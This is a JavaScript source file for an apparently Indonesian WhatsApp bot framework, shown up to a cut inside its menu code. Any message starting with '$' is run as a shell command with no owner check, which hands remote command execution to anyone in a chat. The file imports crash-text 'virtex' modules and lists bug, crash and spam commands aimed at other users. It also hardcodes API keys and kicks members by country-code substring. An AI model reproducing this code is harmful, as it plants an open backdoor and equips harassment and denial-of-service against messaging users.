//JANGAN DI HAPUS YA

//BASE BARU NIH
//CREATOR BASE : BAMBANG TRI RAHARJO
//KLO MAU RECODE / EDIT KASIH NAMA CREATOR ASLI NYA
//HARGAI PEMBUAT BASE YA

//JANGAN LUPA FOLLOW
//ALL SOSIAL MEDIAKU

//INSTAGRAM : @
//YOUTUBE : 
//TIKTOK : @
//GITHUB : 

//THANKS UDAH MAKE BASE INI


var {
WAConnection,
MessageType,
ChatModification,
Presence,
MessageOptions,
Mimetype,
WALocationMessage,
WA_MESSAGE_STUB_TYPES,
WA_DEFAULT_EPHEMERAL,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
waChatKey,
mentionedJid,
processTime,
} = require('@adiwajshing/baileys')
var { color, bgcolor } = require('../mess/color')
var { virtex1 } = require('../virtex/virtex1')
var { virtex2 } = require('../virtex/virtex2')
var { virtex3 } = require('../virtex/virtex3')
var { virtex4 } = require('../virtex/virtex4')
var { virtex5 } = require('../virtex/virtex5')
var { virtex6 } = require('../virtex/virtex6')
var { virtex7 } = require('../virtex/virtex7')
var { virtex8 } = require('../virtex/virtex8')
var { virtex9 } = require('../virtex/virtex9')
var { ngazap } = require('../virtex/ngazap')
var { virtag } = require('../virtex/virtag')
var { emoji2 } = require('../virtex/emoji2')
var speed = require('performance-now')
var translate = require('@vitalets/google-translate-api')
var { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('../mess/myfunc')
var { fetchJson, kyun, fetchText } = require('../mess/fetcher')
var { y2mateA, y2mateV } = require('../mess/y2mate')
var { herolist } = require('../mess/herolist')
var { herodetails } = require('../mess/herodetail')
var Exif = require('../mess/exif')
var { uploadimg, upload } = require('../mess/uploadimg')
var { addCommands, checkCommands, deleteCommands } = require('../storage/autoresp')
var scrapper = require('../lib/scrapper')
var { wikiSearch } = require('../mess/wiki')
var { mediafireDl } = require('../mess/mediafire')
var { lirikLagu } = require('../mess/lirik.js')
var { webp2mp4File } = require('../mess/webp2mp4')
var exif = new Exif()
var request = require('request')
var Math_js = require('mathjs')
var fs = require('fs')
var hx = require('hxz-api')
var brainly = require('brainly-scraper')
var axios = require("axios")
var ggs = require('google-it')
var googleImage = require('g-i-s')
var yts = require( 'yt-search')
var ytsd = require('ytsr')
var ffmpeg = require('fluent-ffmpeg')
var fetch = require('node-fetch')
var crypto = require('crypto')  
var simple = require('../mess/simple.js')
var { EmojiAPI } = require("emoji-api")
var emoji = new EmojiAPI()
var { removeBackgroundFromImageFile } = require('remove.bg')
var moment = require('moment-timezone')
var { exec, spawn, execSync } = require('child_process')
fakeimg = fs.readFileSync('./img/zero.jpg')
fakethumb = fs.readFileSync('./img/thumbnail.jpg')
faketeks = '©CREATED BY BAMBANG TRI RAHARJO'
blocked = []
multi =false
autorespon = false
offline = false
nopref = false
allpref = true
simple != false
antical = true
readGc = true
readPc = true
autovn = true
autoketik = false
antidel = true
autojoin = true

//━━━━━━━━━━━━━━━[ STORAGE ]━━━━━━━━━━━━━━━━━//
var kickarea = JSON.parse(fs.readFileSync("./storage/antibule.json"));
var welcome = JSON.parse(fs.readFileSync('./storage/welcome.json'))
var nsfww = JSON.parse(fs.readFileSync('./mess/nsfww.json'))
var setting = JSON.parse(fs.readFileSync('./setting.json'))
var config = JSON.parse(fs.readFileSync('./srv/config.js'))
var mute = JSON.parse(fs.readFileSync('./storage/mute.json'))
var antilink = JSON.parse(fs.readFileSync('./storage/antilink.json'))
var antivirtex = JSON.parse(fs.readFileSync('./storage/antivirtex.json'))
var imagi = JSON.parse(fs.readFileSync('./storage/imagi.json'))
var setik = JSON.parse(fs.readFileSync('./storage/setik.json'))
var vien = JSON.parse(fs.readFileSync('./storage/vien.json'))
var pendaftar = JSON.parse(fs.readFileSync('./storage/user.json'))
var commandsDB = JSON.parse(fs.readFileSync('./storage/commands.json'))


//━━━━━━━━━━━━━━━[ SETTING ]━━━━━━━━━━━━━━━━━//

NomorOwner = setting.NomorOwner
NameBot = setting.NameBot
NameOwner = setting.NameOwner

//━━━━━━━━━━━━━━━[ APIKEY ]━━━━━━━━━━━━━━━━━//

var apikey1 = config.apikey1
var apikey2 = config.Xteam
var apikey3 = config.Vhtear
var apikey4 = config.Zeks
var apikey5 = config.Zero
var apikey6 = config.Nurutomo
var apikey7 = config.Hunter
var apikey10 = config.LexApi
var xchillds = 'XChillDs'
var hardi = '12345'
var apisenku = 'SenkuApi' //UNLIMITED
var rakukey = 'RakuKeyTod' //KEKNYA UNLIMITED
dapukey = 'wf2tghNhfU' //3000 LIMIT
botxyz = 'Aprii' //GW KASIH UNLIMITED
hardikey = 'hardianto' //UNLIMITED
vinkoapi = 'rxking' //UNLIMITED
ogatakey = 'KFrfhVC4' // 3000 limit
apixteam = 'bb3f4daecfeb0cf0' // APIKEY XTEAM REGIST AJA BIAR GA CEPET HA
TobzKey = 'BotWeA'
TechApi = '5BNIDH-1T0kPj-gWqG6q-sHtuHA-AWBSgZ'
zeksapi = 'ApiBotIndo' //3000 LIMIT

//━━━━━━━━━━━━━━━[ JAM ]━━━━━━━━━━━━━━━━━//

var time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var ucapanWaktu = 'Good night'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Good afternoon'
}
if(time2 < "18:00:00"){
var ucapanWaktu = 'Good afternoon'
}
if(time2 < "15:00:00"){
var ucapanWaktu = 'Good afternoon'
}
if(time2 < "11:00:00"){
var ucapanWaktu = 'Good morning'
}
if(time2 < "05:00:00"){
var ucapanWaktu = 'Good Night'
}
//FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
var runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
};
var sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
var datw = new Date();
var tahun = datw.getFullYear();
  var bulan = datw.getMonth();
    var tanggal = datw.getDate();
      var hari = datw.getDay();
        var jams = datw.getHours();
          var menit = datw.getMinutes();
            var detik = datw.getSeconds();
switch(hari) {
          case 0: hari = "Minggu"; break;
         case 1: hari = "Senin"; break;
       case 2: hari = "Selasa"; break;
     case 3: hari = "Rabu"; break;
   case 4: hari = "Kamis"; break;
 case 5: hari = "Jum'at"; break;
case 6: hari = "Sabtu"; break;
        }
switch(bulan) {
case 0: bulan = "Januari"; break;
        case 1: bulan = "Februari"; break;
                 case 2: bulan = "Maret"; break;
                          case 3: bulan = "April"; break;
                                   case 4: bulan = "Mei"; break;
                                            case 5: bulan = "Juni"; break;
                                                     case 6: bulan = "Juli"; break;
                                                              case 7: bulan = "Agustus"; break;
                                                                       case 8: bulan = "September"; break;
                                                                                case 9: bulan = "Oktober"; break;
                                                                                         case 10: bulan = "November"; break;
                                                                                                  case 11: bulan = "Desember"; break;
        }

//━━━━━━━━━━━━━━━[ MODULE EXPORT ]━━━━━━━━━━━━━━━━━//
 
module.exports = zero = async (zero, zer) => {
try {
if (!zer.hasNewMessage) return
zer = zer.messages.all()[0]
if (!zer.message) return
if (zer.key && !zer.key.remoteJid == 'status@broadcast') return
global.blocked
zer.message = (Object.keys(zer.message)[0] === 'ephemeralMessage') ? zer.message.ephemeralMessage.message : zer.message
var typei = Object.keys(zer.message)[0]
global.prefix
var content = JSON.stringify(zer.message)
var from = zer.key.remoteJid
var type = Object.keys(zer.message)[0]
var { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
var time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
var datre = new Date().toLocaleDateString()
var wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
var wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
var wit = moment.tz('Asia/Jayapura').format('HH : mm :ss')
var dates = moment().tz('Asia/Jakarta').format("YYYY-MM-DDTHH:mm:ss");
var date = new Date(dates);
var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var haris = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var waktoo = date.getHours();
var cmd = (type === 'conversation' && zer.message.conversation) ? zer.message.conversation : (type == 'imageMessage') && zer.message.imageMessage.caption ? zer.message.imageMessage.caption : (type == 'videoMessage') && zer.message.videoMessage.caption ? zer.message.videoMessage.caption : (type == 'extendedTextMessage') && zer.message.extendedTextMessage.text ? zer.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
} else {
if (nopref){
prefix = ''
} else {
if (allpref){
var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : ''
} else {
prefix = prefa
}
}
}
body = (type === 'conversation' && zer.message.conversation.startsWith(prefix)) ? zer.message.conversation : (type == 'imageMessage') && zer.message[type].caption.startsWith(prefix) ? zer.message[type].caption : (type == 'videoMessage') && zer.message[type].caption.startsWith(prefix) ? zer.message[type].caption : (type == 'extendedTextMessage') && zer.message[type].text.startsWith(prefix) ? zer.message[type].text : (type == 'listResponseMessage') && zer.message[type].singleSelectReply.selectedRowId ? zer.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && zer.message[type].selectedButtonId ? zer.message[type].selectedButtonId : ''
var budo = (typei === 'conversation') ? zer.message.conversation : (typei === 'extendedTextMessage') ? zer.message.extendedTextMessage.text : ''
var budy = (type === 'conversation') ? zer.message.conversation : (type === 'extendedTextMessage') ? zer.message.extendedTextMessage.text : ''
var command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
var args = body.trim().split(/ +/).slice(1)
var isCmd = body.startsWith(prefix)
var arg = budy.slice(command.length + 2, budy.length)
var q = args.join(' ')
var timestampi = speed();
var latensyi = speed() - timestampi
var pes = (type === 'conversation' && zer.message.conversation) ? zer.message.conversation : (type == 'imageMessage') && zer.message.imageMessage.caption ? zer.message.imageMessage.caption : (type == 'videoMessage') && zer.message.videoMessage.caption ? zer.message.videoMessage.caption : (type == 'extendedTextMessage') && zer.message.extendedTextMessage.text ? zer.message.extendedTextMessage.text : ''
var messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
var botNumber = zero.user.jid
var Verived = "0@s.whatsapp.net"
var num = "6282313021398@s.whatsapp.net"
var ownerNumber = ["6282313021398@s.whatsapp.net",`${NomorOwner}@s.whatsapp.net`]
var isGroup = from.endsWith('@g.us')
var sender = zer.key.fromMe ? zero.user.jid : isGroup ? zer.participant : zer.key.remoteJid
var senderNumber = sender.split("@")[0] 
var conts = zer.key.fromMe ? zero.user.jid : zero.contacts[sender] || { notify: jid.replace(/@.+/, '') }
var pushname = zer.key.fromMe ? zero.user.name : conts.notify || conts.vname || conts.name || '-'
var groupMetadata = isGroup ? await zero.groupMetadata(from) : ''
var groupName = isGroup ? groupMetadata.subject : ''
var groupId = isGroup ? groupMetadata.jid : ''
var groupMembers = isGroup ? groupMetadata.participants : ''
var groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
var groupDesc = isGroup ? groupMetadata.desc : ''
var groupOwner = isGroup ? groupMetadata.owner : ''
var isOwner = ownerNumber.includes(sender)
var isUser = pendaftar.includes(sender)
var isMuted = isGroup ? mute.includes(from) : false
var isWelcome = isGroup ? welcome.includes(from) : false
var isGroupAdmins = groupAdmins.includes(sender) || false
var isBotGroupAdmins = groupAdmins.includes(botNumber) || false
var isAntilink = isGroup ? antilink.includes(from) : false
var isKickarea = isGroup ? kickarea.includes(from) : false;
var isNsfw = isGroup ? nsfww.includes(from) : false
var isAntivirtex = isGroup ? antivirtex.includes(from) : false
var isButton = (type == 'buttonsResponseMessage') ? zer.message.buttonsResponseMessage.selectedButtonId : ''
		
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙂𝙘
var ampun = await zero.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await zero.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙋𝙘
var chatss = await zero.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await zero.chatRead(jid)
})

// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
if (autovn) {
	if (autovn === false) return
await zero.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await zero.updatePresence(from, Presence.composing)
}

//━━━━━━━━━━━━━━━[ MESSAGE ]━━━━━━━━━━━━━━━━━//
		
mess = {
wait: 'Mohon Tunggu... Sedang Proses',
success: 'Done...Jangam Lupa Subscribe BAMBANG TRI RAHARJO',
wrongFormat: 'Format salah, Silahkan Cek Lagi Di List Menu',
error: {
stick: 'Sticker Salah Mohon Coba Lagi',
Iv: 'Link Error Silahkan Ganti Yg Lain'
},
only: {
owner: 'Khusus Owner Bot',
group: 'Khusus Di Group',
bodmin: 'Jadikan Bot Admin Dulu',
admin: 'Khusus Admin Group'
}
}

//━━━━━━━━━━━━━━━[ CONNECTION ]━━━━━━━━━━━━━━━━━//
		
var isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
}
var reply = (teks) => {
zero.sendMessage(from, teks, text, {quoted:ftrol})
}
var sendMess = (hehe, teks) => {
zero.sendMessage(hehe, teks, text)
}
var mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? zero.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : zero.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
}
var isSelfNumber = [`6282313021398@s.whatsapp.net`]
var costum = (pesan, tipe, target, target2) => {
zero.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
}
        
zero.chatRead(from, "read")

//━━━━━━━━━━━━━━━[ FAKE ]━━━━━━━━━━━━━━━━━//
const flexx = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "status@broadcast" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `𝐉𝐚𝐧𝐠𝐚𝐧 𝐋𝐮𝐩𝐚 𝐁𝐚𝐡𝐚𝐠𝐢𝐚 𝐘𝐚`,
                 "title": `𝐉𝐚𝐧𝐠𝐚𝐧 𝐋𝐮𝐩𝐚 𝐁𝐚𝐡𝐚𝐠𝐢𝐚 𝐘𝐚`,
                 'jpegThumbnail': fs.readFileSync("./stik/fake.jpeg"),
                        }
	                  } 
                     }

var ftrol = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 169,
status: 1,
surface : 1,
message: `Subscribe BAMBANG TRI RAHARJO`, 
orderTitle: `Subscribe BAMBANG TRI RAHARJO`,
thumbnail: fakethumb,
sellerJid: '0@s.whatsapp.net' 
}
}
}

//━━━━━━━━━━━━━━━[ BUTTON ]━━━━━━━━━━━━━━━━━//

var sendButMessage = (id, text1, desc1, but = [], options = {}) => {
var buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
zero.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
)
}
async function sendButLocation(id, text1, desc1, gam1, but = [], options = {}) {
let buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: text1, footerText: desc1, buttons: but, headerType: 6 }
return zero.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
var sendButImage = async (
id,
text1,
desc1,
gam1,
but = [],
options = {}
) => {
kma = gam1;
mhan = await zero.prepareMessage(from, kma, image);
var buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4,
}
zero.sendMessage(
id,
buttonMessages,
MessageType.buttonsMessage,
options
)
}

//━━━━━━━━━━━━━━━[ CONNECTION 2 ]━━━━━━━━━━━━━━━━━//

var sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './stik' + names + '.png', async function () {
console.log('selesai');
let filess = './stik' + names + '.png'
let asw = './stik' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
zero.sendMessage(to, media, MessageType.sticker,{quoted:ftrol})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}
var sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
var fn = Date.now() / 10000;
var filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
zero.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
fs.unlinkSync(filename)
});
}
var sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
zero.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
zero.sendMessage(from, hasil, type, options).catch(e => {
zero.sendMessage(from, { url : link }, type, options).catch(e => {
reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
console.log(e)
})
})
})
})
}	
var sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer ${NameBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        zero.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            var hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await zero.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        zero.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }

//━━━━━━━━━━━━━━━[ MESSAGE GROUP ]━━━━━━━━━━━━━━━━━//

if (isGroup && isAntilink && !zer.key.fromMe) {
if (budy.includes("://chat.whatsapp.com/")) {
if (isGroupAdmins) return reply("admin bebas");
reply("ANTILINK DETECTED!! Maaf Kamu Dikick Dari Group");
zero.groupRemove(from, [sender]);
}
}
if (budy.length > 3500) {
if (!isGroup) return
if (!isAntivirtex) return
if (isGroupAdmins) return
reply('Tandai telah dibaca\n'.repeat(300))
reply(`「 VIRTEX DETECTED!! 」\n\nKamu Mengirimkan Virus, Maaf Kamu Di Kick Dari Group :(`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
zero.groupRemove(from, [sender])
}     
if (isMuted){
            if (!isGroupAdmins && !isOwner && !zer.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./storage/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }

//━━━━━━━━━━━━━━━[ MEDIA ]━━━━━━━━━━━━━━━━━//
            
colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
var isMedia = (type === 'imageMessage' || type === 'videoMessage')
var isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
var isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
var isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
var isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
var sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]

if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        zero.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !zer.key.fromMe) {
      if (sender.includes("91")) {
        reply("GRUP ONLY +91!");
        zero.groupRemove(from, [sender]);
      }
    }
    //auto voice note by Bambang
    for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					zero.sendMessage(from, result, audio, { mimetype: 'audio/mp4', ptt: true, quoted: zer})
					}
			}
			//auto sticker
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./media/sticker/${anji}.webp`)
					zero.sendMessage(from, result, sticker, { quoted: zer})
					}
			}
			//auto image
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					zero.sendMessage(from, result, image, { quoted: zer})
					}
			}
			// auto text 
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
			// $cat
			    if (budy.startsWith('$')){
      const cod = args.join(' ')
      exec(cod, (err, stdout) => {
      if(err) return reply(`${err}`)
      if (stdout) {
      reply(`${stdout}`)
      }
      })
    }
    // whatsapp profie o status san\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await zero.setStatus(`Bot Mode On Since ${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    
//━━━━━━━━━━━━━━━[ FITURNYA ]━━━━━━━━━━━━━━━━━//

switch (command) {                              
case 'menu':
case 'help':
case 'p':
                          res = await zero.prepareMessageFromContent(from,{
"listMessage": {
"title": '「 INFO USER 」',
"description": `Nama : ${pushname}
Nomer : @${sender.split('@')[0]}

「 INFO BOT 」
🎃Creator Bot : ©CREATED BY BAMBANG TRI RAHARJO
🌐 Prefix :  ⌜  ${prefix}  ⌟
🍬 Name Bot : ${NameBot}
☕ Runtime : ${runtime(process.uptime())}
📌 Speed : ${latensyi.toFixed(4)} Second
👥 Lib : Baileys 
🎈 Type : NodeJS

TIME ZONE
${wib} WIB
${wita} WITA
${wit} WIT`,
"buttonText": "𝐌𝐄𝐍𝐔",
"listType": "SINGLE_SELECT",
"sections": [
{
"title": `${hari} - ${tanggal} - ${bulan} - ${tahun}`,
    "rows": [ 
       {
           "title": "Owner Menu",
           "rowId": `ownermenu`
           },
	       {
           "title": "Download Menu",
           "rowId": `downloadmenu`
           },
	       {
           "title": "Group Menu",
           "rowId": `groupmenu`
           },
	       {
	       "title": "Tools Menu",
           "rowId": `toolsmenu`
           },
           {
	       "title": "Storage Menu",
           "rowId": `storagemenu`
           },
           {
           "title": "Fun Menu",
           "rowId": `funmenu`
           },
           {
           "title": "Ephoto Menu",
           "rowId": `ephotomenu`
           },
           {
	       "title": "Maker Menu",
           "rowId": `makermenu`
           },
           {
           "title": "Script Bot",
           "rowId": `sc`
           },
           {
           "title": "All Menu",
           "rowId": `allmenu`
           },
           {
           "title": "Owner Bot",
           "rowId": `owner`
           },
	       {
           "title": "Info Bot",
           "rowId": `infobot`
           },
           {
           "title": "Gacha Cecan",
           "rowId": `gachacecan`
           },
           {
           "title": "Asupan Menu",
           "rowId": `asupanmenu`
           },
           {
           "title": "Random menu",
           "rowId": `randommenu`
          /* },
           {
           "title": "Nsfw menu",
           "rowId": `nsfwmenu`*/
           },
           {
           "title": "Anime Menu",
           "rowId": `animemenu`
           },
           {
           "title": "18+ & Sound Menu",
           "rowId": `18&soundmenu`
           },
           {
           "title": "S&K",
           "rowId": `s&k`
           }
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 zero.relayWAMessage(res)
 break
 case 'ownermenu':
 menu = `❏ 「 \`\`\`OWNER MENU\`\`\` 」
 
 ➤ ${prefix}bc [  _teks/reply gif/image/video with caption_ ]
➤ ${prefix}addrespond  [pertanyaan|jawaban]
➤ ${prefix}delrespond
➤ ${prefix}listrespond
 ➤ ${prefix}setreply
 ➤ ${prefix}setfakeimg
 ➤ ${prefix}setthumb
 ➤ ${prefix}bugcatalog
 ➤ ${prefix}buggc id grup
 ➤ ${prefix}okvirtex
 ➤ ${prefix}delete [_@tagpesan_]
 ➤ ${prefix}unarchive
 ➤ ${prefix}archive
 ➤ ${prefix}unarchiveall
 ➤ ${prefix}piltek
 ➤ ${prefix}gift
 ➤ ${prefix}readall
 ➤ ${prefix}unreadall
 ➤ ${prefix}delchat
 ➤ ${prefix}anticall [_on/off_]
 ➤ ${prefix}autoread [_gc/pc on/ gc/pc off]
 ➤ ${prefix}autovn [_on/off_]
 ➤ ${prefix}autotype [_on/off_]
 ➤ ${prefix}autojoin [_on/off_]
 ➤ ${prefix}mute
 ➤ ${prefix}unmute
 ➤ ${prefix}spam [ _teks|jumlah_ ]
 ➤ ${prefix}demoteall
 ➤ ${prefix}promoteall
 ➤ ${prefix}spamsw [ _teks|jumlah_ ]
 ➤ ${prefix}upswteks [ _teks_ ]
 ➤ ${prefix}upswlokasi [ _teks_ ]
 ➤ ${prefix}upswaudio [ _reply audio_ ]
 ➤ ${prefix}upswvoice [ _reply audio_ ]
 ➤ ${prefix}upswsticker [ _reply sticker_ ]
 ➤ ${prefix}upswimage [ _reply image with caption_ ]
 ➤ ${prefix}upswgif  [ _reply gif with caption_ ]
 ➤ ${prefix}upswvideo [ _reply video with caption_ ]
 ➤ ${prefix}shutdown
 ➤ ${prefix}offline
 ➤ ${prefix}online
 ➤ ${prefix}exif [ _nama|author_ ]
 ➤ ${prefix}setppbot [ _reply image_ ]
 ➤ ${prefix}setnamebot [ _teks_ ]
 ➤ ${prefix}setprefix [ _multi/nopref/prefix_ ]
 ➤ ${prefix}setbio [ _teks_ ]
 ➤ ${prefix}leave
 ➤ ${prefix}restart
 ➤ ${prefix}join [ _link group_ ]
 ➤ ${prefix}readall
 ➤ ${prefix}unreadall
 ➤ ${prefix}pin
 ➤ ${prefix}unpin
 ➤ ${prefix}nano [ _nama file_ ]
 ➤ ${prefix}report [ _teks_ ]
 ➤ ${prefix}runtime
 ➤ ${prefix}speed`
 but = [
                { buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 },
                { buttonId: 's&k', buttonText: { displayText: 'S&K' }, type: 1 }
                 ]
sendButLocation(from, menu, "©CREATED BY BAMBANG TRI RAHARJO", fakeimg, but, zer)
break
/* case 'nsfwmenu':
 menu = `❏ 「 \`\`\`NSFW \`\`\` 」
➤ ${prefix}yuri
➤ ${prefix}hentai
➤ ${prefix}anal
➤ ${prefix}eroneko
➤ ${prefix}lesbian
➤ ${prefix}kitsune
➤ ${prefix}bj
➤ ${prefix}pussy
➤ ${prefix}wallpaper
